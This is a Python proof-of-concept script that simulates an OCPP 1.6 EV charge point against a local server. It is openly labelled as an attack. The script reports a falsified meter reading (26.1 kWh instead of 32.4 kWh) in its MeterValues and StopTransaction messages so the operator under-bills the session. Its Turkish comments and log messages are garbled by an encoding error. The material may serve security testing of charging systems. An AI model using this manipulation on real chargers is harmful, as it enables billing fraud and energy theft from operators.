import asyncio
import logging
import websockets
from ocpp.v16 import call
from ocpp.v16.enums import RegistrationStatus, Measurand
from ocpp.charge_point import ChargePoint

logging.basicConfig(level=logging.INFO)

CHARGE_POINT_ID = 'TEST_EVSE_001' # Åarj istasyonu kimliÄŸi
CSMS_URL = 'ws://127.0.0.1:9003/TEST_EVSE_001' # Sunucu adresi (localhost)

# SimÃ¼lasyon parametreleri
GERCEK_KWH = 32.4  # GerÃ§ekte verilen enerji (kWh)
MANIPULE_KWH = 26.1 # ManipÃ¼le edilerek gÃ¶nderilecek enerji (kWh)

# OCPP Ä°stemcisi (Åarj Ä°stasyonu) simÃ¼lasyonu
class ChargePointManipulator(ChargePoint):

    # Sunucuya kaydolma (BootNotification)
    async def send_boot_notification(self):
        logging.info("ğŸ”Œ [Ä°STASYON] Sunucuya kaydolma (BootNotification) gÃ¶nderiliyor...")
        request = call.BootNotification(
            charge_point_model="Manipulator_V1",
            charge_point_vendor="TestVendor"
        )
        response = await self.call(request)
        
        if response.status == RegistrationStatus.accepted:
            logging.info("âœ… [Ä°STASYON] KayÄ±t BaÅŸarÄ±lÄ±. Kalp atÄ±ÅŸÄ± periyodu: %s s", response.interval)
            await self.start_session()
        else:
            logging.error("âŒ [Ä°STASYON] KayÄ±t Reddedildi.")

    # Åarj oturumunu baÅŸlatma
    async def start_session(self):
        # SimÃ¼lasyon: Oturumu baÅŸlat
        await self.send_start_transaction()
        
        # SayaÃ§ verilerini periyodik olarak gÃ¶nderme
        await self.send_meter_values(is_manipulated=False, current_kwh=GERCEK_KWH)
        await asyncio.sleep(5)
        
        # !!! BURASI SALDIRI NOKTASI !!!
        logging.warning("ğŸš¨ [SALDIRGAN] Ã–lÃ§Ã¼m verisi manipÃ¼le ediliyor! GerÃ§ek: %.1f kWh, GÃ¶nderilen: %.1f kWh", GERCEK_KWH, MANIPULE_KWH)
        await self.send_meter_values(is_manipulated=True, current_kwh=MANIPULE_KWH)
        
        await asyncio.sleep(5)
        # SimÃ¼lasyon: Oturumu sonlandÄ±r
        await self.send_stop_transaction()
        
    # StartTransaction gÃ¶nderme
    async def send_start_transaction(self):
        request = call.StartTransaction(
            connector_id=1,
            id_tag='A0001',
            timestamp='2025-11-23T10:00:00Z',
            meter_start=0
        )
        await self.call(request)
        logging.info("â–¶ï¸ [Ä°STASYON] Oturum BaÅŸlatÄ±ldÄ± (StartTransaction).")

    # SayaÃ§ verilerini (MeterValues) gÃ¶nderme
    async def send_meter_values(self, is_manipulated, current_kwh):
        
        # OCPP MeterValue formatÄ±na uygun veri yapÄ±sÄ±nÄ± hazÄ±rla
        meter_value = [
            {
                'timestamp': '2025-11-23T10:05:00Z',
                'sampled_value': [
                    {
                        'value': str(current_kwh), # ManipÃ¼le edilmiÅŸ/GerÃ§ek deÄŸer
                        'measurand': Measurand.energy_active_import_register # kWh cinsinden enerji
                    }
                ]
            }
        ]

        request = call.MeterValues(
            connector_id=1,
            meter_value=meter_value,
            transaction_id=1
        )
        
        await self.call(request)
        logging.info(f"ğŸ“Š [Ä°STASYON] SayaÃ§ DeÄŸeri GÃ¶nderildi. GÃ¶nderilen kWh: {current_kwh} {'(MANÄ°PÃœLE EDÄ°LDÄ°)' if is_manipulated else '(GERÃ‡EK)'}")

    # StopTransaction gÃ¶nderme
    async def send_stop_transaction(self):
        request = call.StopTransaction(
            meter_stop=MANIPULE_KWH * 1000, # kWh'Ä± Wh'a Ã§evir, manipÃ¼le edilmiÅŸ deÄŸeri gÃ¶nder
            timestamp='2025-11-23T10:10:00Z',
            transaction_id=1
        )
        await self.call(request)
        logging.info("â¸ï¸ [Ä°STASYON] Oturum SonlandÄ±rÄ±ldÄ± (StopTransaction).")
        logging.info("ğŸ’¸ [SONUÃ‡] OperatÃ¶r (CPO) faturalanmasÄ± gereken enerjiyi eksik hesaplayacak: %.1f kWh eksik.", GERCEK_KWH - MANIPULE_KWH) #


# Ä°stemciyi baÅŸlatma fonksiyonu
async def main():
    try:
        # WebSocket baÄŸlantÄ±sÄ±nÄ± baÅŸlat
        async with websockets.connect(CSMS_URL, subprotocols=['ocpp1.6']) as websocket:
            cp = ChargePointManipulator(CHARGE_POINT_ID, websocket)
            # BootNotification ile baÅŸla
            await cp.send_boot_notification()
            
            # TÃ¼m mesajlarÄ± dinlemeye devam et
            await asyncio.Future() 

    except ConnectionRefusedError:
        logging.error("âŒ [HATA] Sunucuya baÄŸlanÄ±lamadÄ±. LÃ¼tfen sunucunun (Terminal 1) Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan emin olun.")
    except Exception as e:
        logging.error(f"âŒ [HATA] Bir hata oluÅŸtu: {e}")

if __name__ == '__main__':
    asyncio.run(main())
